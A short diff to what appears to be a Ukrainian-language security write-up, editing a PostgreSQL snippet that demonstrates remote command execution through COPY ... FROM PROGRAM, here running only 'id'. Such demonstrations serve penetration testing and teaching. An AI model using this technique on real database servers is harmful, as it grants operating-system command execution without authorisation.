@@ -75,7 +75,8 @@ SELECT config_key, config_val FROM system_config;
 
 Демонстрація RCE (COPY FROM PROGRAM):
 ```
-CREATE TABLE cmd_exec (output text);
+CREATE TABLE IF NOT EXISTS cmd_exec (output text);
+TRUNCATE cmd_exec;
 COPY cmd_exec FROM PROGRAM 'id';
 SELECT * FROM cmd_exec;
 ```
